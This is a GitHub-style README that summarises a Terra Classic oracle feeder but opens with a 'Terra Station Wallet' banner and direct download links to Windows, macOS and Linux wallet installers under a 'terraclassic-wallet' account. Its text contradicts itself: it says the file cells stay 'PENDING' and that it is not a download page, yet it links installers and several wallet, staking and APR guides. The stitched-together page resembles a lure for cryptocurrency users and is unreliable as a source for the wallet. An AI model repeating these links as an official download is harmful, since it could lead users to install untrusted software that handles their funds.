![Terra Station Wallet](assets/banner-repo.png)

<h1 align="center">Oracle Feeder</h1>

<p align="center">The two-part voting service a Terra Classic validator runs so the oracle is fed every 30 seconds without going to jail.</p>

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/blob/HEAD/LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-5392F7?style=for-the-badge&labelColor=101A42" alt="license Apache--2.0"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

The desktop wallet's installers sit on its release page; nothing is attached to this repository, so each File cell above stays PENDING.

## What this repository is for

This repository carries the oracle feeder software used to submit oracle votes for the exchange rate of the assets offered by the oracle chain. It can be run as it stands, and it also works as a reference for anyone writing a feeder of their own.

The README states the constraint that explains the whole design: every validator has to take part in the oracle process and periodically vote the rate of LUNC in all whitelisted denominations. That window is 30 seconds, so the vote cannot be a person clicking a button. Validators who miss it get slashed and jailed, which is why automation is not a convenience here but the only workable arrangement.

The code is split into two components, and the split is the important part. `price-server` pulls rates from exchanges and forex data sources, models the data and exposes a URL to query it. `feeder` reads that URL and submits vote and prevote messages on the schedule the oracle procedure expects. Keeping the pair apart means the internet-facing half can sit on a public host while the signing half stays where the validator key lives.

## Who it is for

- A validator operator on Terra Classic who needs the oracle vote automated and is deciding how to deploy it.
- An operator who already runs a feeder and wants to check the deployment against the reference implementation.
- Someone writing a custom feeder, using this repository as the worked example the README says it is.
- A reader who arrived from a search result and needs to know, quickly, that this is infrastructure and not the wallet.

If you came here looking for the desktop application, this is the wrong page: the wallet is published from its own repository, with its release record and checksums there.

## Start here

- [Terra Station Wallet](https://github.com/terraclassic-wallet/terra-station-wallet) - The desktop app, its release history and the licence covering it.
- [Terra Station Wallet releases](https://github.com/terraclassic-wallet/terra-station-wallet/releases) - Installer files and the SHA-256 value published with each.
- [What Terra Station Wallet Is and Who Maintains It](https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-what-is-it.md) - Where the product boundary runs.
- [The account profile](https://github.com/terraclassic-wallet) - Every repository in the account, arranged by purpose.
- [Choosing a Terra Station validator](https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-validator-choice.md) - What a delegator is actually picking, before the commission figure.
- [Terra Station staking](https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-staking.md) - Delegation, rewards and the unbonding period in one pass.
- [LUNC staking APR](https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/lunc-staking-apr.md) - Why the rate moves, and how to read it without a calculator.

## How to use this repository

1. Read the requirements before installing anything. The README asks for a validator node, a network split between public and private, an instance for the node that broadcasts, an internet-facing instance for the price server, and an instance for the feeder inside the private network.
2. Decide between the two deployment routes. `docker-compose` is the recommended route and the README labels it experimental; the manual route is Node.js and two `npm` projects.
3. Bound the voter to the validator before the first vote. The README puts this in capitals, and it is the step that turns a running container into a working feed.
4. Keep the feeder where the plan says it goes. The README is explicit that it belongs in the private network next to the validator.
5. Check the chain identifier. The sample configuration uses `columbus-5`, and a feeder pointed at the wrong chain votes into nothing.

## The guides, grouped

This repository ships one document, its README, and the README is organised in sections that map onto the deployment:

| Section | Covers | Use it when |
| --- | --- | --- |
| Overview | The two components and what each one does | You are deciding whether this fits your setup |
| Requirements | Node, network shape and the three instances | You are sizing the deployment |
| Using docker-compose | Environment variables and one command to bring the stack up | You want the recommended route |
| Manual deployment | Node.js, `price-server` configuration, `feeder` key and vote command | You want the parts visible |
| Cheat sheet | Start, stop, clean, logs, upgrade, build from source | The stack is already running |

## What each deployment route changes

| Route | What you run | What you maintain |
| --- | --- | --- |
| docker-compose | Two services with the password, mnemonic and validator address passed as environment variables | Docker and Compose on the host, and the compose file itself |
| Manual | `price-server` on Node.js, publishing rates at a local URL, and `feeder` started with a data source, LCD URLs, chain id, validator and password | Two Node.js projects, their configuration and their process supervision |

The manual route is the one to read even if you deploy with Compose, because the compose file is only those same two programs with their arguments written down.

## Common first questions

### Do I need to run a validator to use this?

Yes. The software exists to vote on behalf of a validator, and the README's first requirement is a validator node setup. Without one there is nothing to bound a voter to and no vote to cast.

### Why every 30 seconds?

That is the oracle window the chain expects votes in. Missing it costs the validator: the README's reason for automating is that a manual process ends in a slash and a jailing.

### Where do the prices come from?

From `price-server`, which collects figures from exchanges and forex sources, models them and serves the result at a URL the feeder reads. The feeder itself does not decide a rate; it transports the one it is given.

### Does this repository ship the wallet?

No. It holds feeder software. The desktop wallet, its release record and its installer files live in the application repository, and no page in this account asks you to fetch an installer from anywhere else.

### Which licence applies?

Apache-2.0, as recorded in this repository and named on the badge at the top. Read the licence file itself before you rely on that summary.

## Before you build

Have the validator address ready in `terravaloper` form, because the feeder command takes it and the vote is bound to it. Decide where the mnemonic lives before you write it into a compose file, since the README's sample passes it as an environment variable alongside the keyring password. Confirm the LCD endpoints you intend to use and the chain id, and check that the feeder host really is inside the private network rather than reachable from outside it.

## About this repository

This is one of the supporting repositories in an account whose public product is Terra Station Wallet. It is infrastructure code, published under its own terms, and it is not a download page. The account's reader-facing material sits in three guide hubs covering installation, recovery and day-to-day use; this repository carries none of it, and the README is the whole of its documentation.

## Licence and reuse

Apache-2.0, as the badge above records. Reuse follows that licence and its notice requirements, and this page adds no condition to it and removes none.